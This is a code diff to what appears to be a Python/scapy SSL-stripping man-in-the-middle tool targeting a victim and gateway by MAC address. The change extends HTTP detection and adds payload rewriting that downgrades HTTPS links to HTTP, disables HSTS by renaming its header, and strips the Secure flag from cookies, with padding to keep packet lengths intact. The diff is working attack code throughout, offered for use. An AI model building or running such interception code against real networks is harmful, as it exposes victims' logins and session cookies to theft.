@@ -113,7 +113,7 @@ def process_packet(pkt, config: SSLStripConfig, victim_mac: str, gateway_mac: st
         payload = pkt[scapy.Raw].load
     
         # Check if it's HTTP traffic
-        if b"GET " in payload or b"POST " in payload or b"HTTP/1.1" in payload:
+        if any(m in payload for m in [b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ", b"HTTP/1."]):
             modified_payload = rewrite_http_payload(payload)
             
             if modified_payload != payload:
@@ -135,9 +135,16 @@ def process_packet(pkt, config: SSLStripConfig, victim_mac: str, gateway_mac: st
 
 def rewrite_http_payload(raw_payload: bytes) -> bytes:
     """Core transformation stage (rewriting logic lives here)."""
-    # Simple regex to replace https:// with http://
-    # We pad with a space to maintain content length and avoid breaking TCP streams
-    # https:// -> http:// 
-    # (8 chars)   (7 chars + space)
-    
-    return re.sub(b'https://', b'http:// ', raw_payload, flags=re.IGNORECASE)
+    # 1. Downgrade HTTPS links to HTTP (maintain length with space)
+    # https:// (8 bytes) -> http://  (8 bytes)
+    payload = re.sub(b'https://', b'http:// ', raw_payload, flags=re.IGNORECASE)
+
+    # 2. HSTS Bypass: Rename header to disable it
+    # Strict-Transport-Security (25 bytes) -> X-Ignore-HSTS + padding (25 bytes)
+    payload = re.sub(b'Strict-Transport-Security', b'X-Ignore-HSTS            ', payload, flags=re.IGNORECASE)
+
+    # 3. Cookie Access: Strip Secure flag
+    # ; Secure (8 bytes) -> ;        (8 bytes)
+    payload = re.sub(b'; Secure', b';       ', payload, flags=re.IGNORECASE)
+
+    return payload
